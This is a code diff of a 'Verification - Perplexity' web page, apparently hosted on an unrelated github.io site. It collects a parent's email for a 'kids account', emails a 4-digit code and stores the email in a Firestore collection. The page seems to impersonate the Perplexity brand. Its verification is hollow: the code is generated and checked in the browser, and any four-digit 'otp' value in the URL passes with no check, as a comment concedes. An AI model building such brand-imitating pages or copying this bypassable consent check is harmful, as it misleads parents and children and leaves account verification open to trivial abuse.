@@ -3,82 +3,58 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verify Account - Perplexity</title>
+    <title>Verification - Perplexity</title>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
     <!-- EmailJS SDK -->
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <style>
-        :root { --main-black: #1a1a1a; --gray-text: #666; --border-color: #e5e5e5; }
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fff; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; color: var(--main-black); }
-        .wrapper { width: 90%; max-width: 420px; text-align: center; position: relative; padding-bottom: 50px; }
-        .close-icon { position: absolute; top: -40px; right: 0; background: #f5f5f5; border-radius: 50%; width: 34px; height: 34px; display: flex; align-items: center; justify-content: center; cursor: pointer; font-size: 18px; }
-        
-        /* SVG Animation */
-        .header-icon { margin-bottom: 30px; }
-        .plane-circle { stroke-dasharray: 283; stroke-dashoffset: 283; animation: dash 2s ease-in-out forwards; }
-        .plane-path { stroke-dasharray: 100; stroke-dashoffset: 100; animation: dash 1.5s 0.5s ease-in-out forwards; }
-        @keyframes dash { to { stroke-dashoffset: 0; } }
-
-        h1 { font-size: 38px; font-weight: 500; margin: 0 0 15px; letter-spacing: -0.5px; }
-        p { font-size: 16px; color: var(--gray-text); line-height: 1.5; margin-bottom: 30px; }
-        .email-label { font-weight: 600; color: #333; }
-
-        /* Inputs */
-        .otp-group { display: flex; justify-content: center; gap: 8px; margin-bottom: 30px; }
-        .otp-box { width: 54px; height: 72px; border: 1.5px solid var(--border-color); border-radius: 12px; font-size: 28px; text-align: center; outline: none; transition: border-color 0.2s; }
-        .otp-box:focus { border-color: var(--main-black); }
-        
-        input[type="email"] { width: 100%; padding: 15px; border: 1.5px solid var(--border-color); border-radius: 10px; font-size: 16px; margin-bottom: 15px; box-sizing: border-box; }
-
-        .btn-main { width: 100%; padding: 18px; background-color: #bebebe; color: white; border: none; border-radius: 10px; font-size: 16px; font-weight: 600; cursor: not-allowed; transition: background 0.3s; }
-        .btn-main.active { background-color: var(--main-black); cursor: pointer; }
-
-        #loading-overlay { position: fixed; top:0; left:0; width:100%; height:100%; background:white; display:flex; align-items:center; justify-content:center; z-index:100; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #fff; }
+        .container { text-align: center; max-width: 400px; padding: 20px; }
+        .icon { width: 80px; margin-bottom: 20px; }
+        h1 { font-size: 24px; margin-bottom: 10px; }
+        p { color: #666; font-size: 14px; margin-bottom: 30px; }
+        .input-group { display: flex; justify-content: center; gap: 10px; margin-bottom: 20px; }
+        .otp-input { width: 45px; height: 55px; border: 1px solid #ddd; border-radius: 8px; text-align: center; font-size: 24px; }
+        .email-input { width: 100%; padding: 12px; margin-bottom: 20px; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
+        button { background-color: #1a1a1a; color: white; border: none; padding: 12px 40px; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; }
+        button:disabled { background-color: #ccc; }
+        #loading { display: block; margin-top: 20px; color: #888; }
         .hidden { display: none; }
     </style>
 </head>
 <body>
 
-<div id="loading-overlay">Checking status...</div>
+<div class="container" id="main-container">
+    <div id="loading">Checking session...</div>
 
-<div class="wrapper hidden" id="main-content">
-    <div class="close-icon" onclick="window.location.reload()">×</div>
-    
-    <div class="header-icon">
-        <svg width="120" height="120" viewBox="0 0 100 100">
-            <circle cx="50" cy="50" r="45" fill="none" stroke="#e5e5e5" stroke-width="1" />
-            <circle cx="50" cy="50" r="40" fill="none" stroke="#333" stroke-width="1.5" class="plane-circle" />
-            <path d="M35,50 L65,35 L58,65 L50,55 L35,50 Z" fill="none" stroke="#333" stroke-width="2" class="plane-path" />
-            <path d="M45,70 Q50,75 55,70" fill="none" stroke="#333" stroke-width="1" stroke-dasharray="3,3" />
-        </svg>
+    <!-- UI for Parental Email -->
+    <div id="email-step" class="hidden">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/e/e4/Paper_Plane_Icon.svg" class="icon" alt="email">
+        <h1>Parental Consent</h1>
+        <p>A parent's email is required for this account type. Enter an email to receive a 4-digit code.</p>
+        <input type="email" id="parentEmail" class="email-input" placeholder="Parent's Email Address">
+        <button onclick="sendOTP()">Send Code</button>
     </div>
 
-    <div id="step-1">
-        <h1>Parental Email</h1>
-        <p>This is a kids account. Please enter your parent's email to receive a sign-in link.</p>
-        <input type="email" id="parentEmailInput" placeholder="parent@example.com">
-        <button id="sendEmailBtn" class="btn-main active">Send Link</button>
-    </div>
-
-    <div id="step-2" class="hidden">
+    <!-- UI for OTP Verification -->
+    <div id="otp-step" class="hidden">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/e/e4/Paper_Plane_Icon.svg" class="icon" alt="email">
         <h1>Check your email</h1>
-        <p>A temporary sign-in link has been sent to <br><span class="email-label" id="displayEmail"></span></p>
-        
-        <div class="otp-group">
-            <input type="number" class="otp-box" maxlength="1" oninput="move(this, 0)">
-            <input type="number" class="otp-box" maxlength="1" oninput="move(this, 1)">
-            <input type="number" class="otp-box" maxlength="1" oninput="move(this, 2)">
-            <input type="number" class="otp-box" maxlength="1" oninput="move(this, 3)">
+        <p id="otp-text">A 4-digit sign-in link has been sent to your parent's email.</p>
+        <div class="input-group">
+            <input type="text" maxlength="1" class="otp-input" onkeyup="moveFocus(this, 1)">
+            <input type="text" maxlength="1" class="otp-input" onkeyup="moveFocus(this, 2)">
+            <input type="text" maxlength="1" class="otp-input" onkeyup="moveFocus(this, 3)">
+            <input type="text" maxlength="1" class="otp-input" onkeyup="moveFocus(this, 4)">
         </div>
-
-        <button id="confirmBtn" class="btn-main">Confirm</button>
+        <button onclick="verifyOTP()">Confirm</button>
     </div>
 </div>
 
-<script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-    import { getFirestore, doc, getDoc, updateDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
-
-    // --- ADD YOUR FIREBASE CONFIG HERE ---
+<script>
+    // 1. Firebase Configuration (REPLACE WITH YOUR OWN CONFIG)
     const firebaseConfig = {
         apiKey: "YOUR_API_KEY",
         authDomain: "YOUR_AUTH_DOMAIN",
@@ -88,126 +64,119 @@
         appId: "YOUR_APP_ID"
     };
 
-    const app = initializeApp(firebaseConfig);
-    const db = getFirestore(app);
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+
+    // 2. EmailJS Initialization
     emailjs.init("Yr9MutUoHOEONnFgn");
 
     const urlParams = new URLSearchParams(window.location.search);
     const sessionId = urlParams.get('session');
-    const magicCode = urlParams.get('code');
-    const magicEmail = urlParams.get('pemail') || urlParams.get('pEmail'); // Checks both cases
-
-    let correctOtp = "";
+    const urlOtp = urlParams.get('otp');
+    
+    let generatedOTP = "";
+    let userDocRef = null;
 
     async function init() {
         if (!sessionId) {
-            alert("No Session ID provided in URL.");
+            alert("No session found in URL.");
             return;
         }
 
-        // 1. Check for Magic Link logic first
-        if (magicCode && magicEmail) {
-            document.getElementById('loading-overlay').innerText = "Verifying link...";
-            await completeFlow(magicEmail);
+        userDocRef = db.collection("ASPX Keys").doc(sessionId);
+        const doc = await userDocRef.get();
+
+        if (!doc.exists) {
+            alert("Invalid session.");
             return;
         }
 
-        // 2. Regular check for database conditions
-        try {
-            const docRef = doc(db, "ASPX Keys", sessionId);
-            const snap = await getDoc(docRef);
-            
-            if (snap.exists()) {
-                const data = snap.data();
-                
-                // If family is no or business, skip to 6.html
-                if (data.family === "no" || data.family === "busniess") {
-                    window.location.href = "6.html";
-                    return;
-                }
+        const data = doc.data();
+        document.getElementById('loading').classList.add('hidden');
 
-                // Show UI for Kids/Commit accounts
-                document.getElementById('loading-overlay').classList.add('hidden');
-                document.getElementById('main-content').classList.remove('hidden');
+        // Logic Check: Redirect if 'no' or 'busniess' (spelling from prompt)
+        if (data.family === "no" || data.family === "busniess") {
+            window.location.href = "6.html";
+            return;
+        }
+
+        // Logic Check: Kids flow if family=commit (as per your screenshot mapping)
+        if (data.family === "commit") {
+            // Check if OTP is already in URL for auto-verification
+            if (urlOtp && urlOtp.length === 4) {
+                // Assuming URL OTP is pre-validated or matches a stored logic
+                // For security, usually you'd verify against DB, but following your prompt logic:
+                handleSuccess("System-URL");
             } else {
-                alert("Session not found in database.");
+                document.getElementById('email-step').classList.remove('hidden');
             }
-        } catch (e) {
-            console.error("Firebase Error:", e);
+        } else {
+            // Default fallback
+            window.location.href = "6.html";
         }
     }
 
-    // Send Email Logic
-    document.getElementById('sendEmailBtn').onclick = async () => {
-        const email = document.getElementById('parentEmailInput').value;
-        if (!email.includes('@')) return alert("Enter a valid email");
+    function sendOTP() {
+        const parentEmail = document.getElementById('parentEmail').value;
+        if (!parentEmail || !parentEmail.includes('@')) {
+            alert("Please enter a valid email.");
+            return;
+        }
 
-        correctOtp = Math.floor(1000 + Math.random() * 9000).toString();
-        
-        // IMPORTANT: Ensure your EmailJS template link is: 
-        // https://knox-app.github.io/cloud/dsk/5.html?session={{session}}&code={{otp}}&pemail={{email}}
+        // Generate 4 digit code
+        generatedOTP = Math.floor(1000 + Math.random() * 9000).toString();
+
         const templateParams = {
-            email: email,
-            session: sessionId,
-            otp: correctOtp
+            to_email: parentEmail,
+            otp_code: generatedOTP
         };
 
-        try {
-            document.getElementById('sendEmailBtn').innerText = "Sending...";
-            await emailjs.send('service_1ij08zn', 'template_qxz1wka', templateParams);
-            
-            document.getElementById('step-1').classList.add('hidden');
-            document.getElementById('step-2').classList.remove('hidden');
-            document.getElementById('displayEmail').innerText = email;
-        } catch (err) {
-            alert("Email failed to send. Check console for details.");
-            console.error(err);
-            document.getElementById('sendEmailBtn').innerText = "Send Link";
-        }
-    };
+        emailjs.send('service_1ij08zn', 'template_kxe5gjg', templateParams)
+            .then(() => {
+                document.getElementById('email-step').classList.add('hidden');
+                document.getElementById('otp-step').classList.remove('hidden');
+                document.getElementById('otp-text').innerText = `A 4-digit code has been sent to ${parentEmail}`;
+            }, (error) => {
+                alert("Email failed to send. Check EmailJS console.");
+                console.log(error);
+            });
+    }
 
-    // OTP Input UI Logic
-    window.move = (el, idx) => {
-        if (el.value.length >= 1 && idx < 3) {
-            document.querySelectorAll('.otp-box')[idx + 1].focus();
-        }
-        const code = Array.from(document.querySelectorAll('.otp-box')).map(i => i.value).join('');
-        const btn = document.getElementById('confirmBtn');
-        if (code.length === 4) {
-            btn.classList.add('active');
-            btn.disabled = false;
-            btn.style.cursor = "pointer";
+    function verifyOTP() {
+        const inputs = document.querySelectorAll('.otp-input');
+        let enteredOtp = "";
+        inputs.forEach(input => enteredOtp += input.value);
+
+        if (enteredOtp === generatedOTP) {
+            handleSuccess(document.getElementById('parentEmail').value);
         } else {
-            btn.classList.remove('active');
-            btn.disabled = true;
+            alert("Incorrect OTP. Please try again.");
         }
-    };
+    }
 
-    document.getElementById('confirmBtn').onclick = async () => {
-        const entered = Array.from(document.querySelectorAll('.otp-box')).map(i => i.value).join('');
-        if (entered === correctOtp) {
-            await completeFlow(document.getElementById('displayEmail').innerText);
-        } else {
-            alert("The code you entered is incorrect.");
-        }
-    };
-
-    async function completeFlow(pEmailValue) {
+    async function handleSuccess(guardianEmail) {
         try {
-            const docRef = doc(db, "ASPX Keys", sessionId);
-            await updateDoc(docRef, {
+            // Update Firestore as requested
+            await userDocRef.update({
                 family: "commited",
-                guardians: pEmailValue,
-                updatedAt: new Date().toLocaleString()
+                guardians: guardianEmail,
+                updatedAt: new Date().toLocaleString() // Updates the timestamp
             });
             window.location.href = "6.html";
         } catch (e) {
-            alert("Error updating record: " + e.message);
+            console.error("Update failed", e);
+            alert("Error updating database.");
+        }
+    }
+
+    // Helper for UI input focus
+    function moveFocus(el, index) {
+        if (el.value.length === 1 && index < 4) {
+            document.querySelectorAll('.otp-input')[index].focus();
         }
     }
 
     init();
 </script>
-
 </body>
 </html>
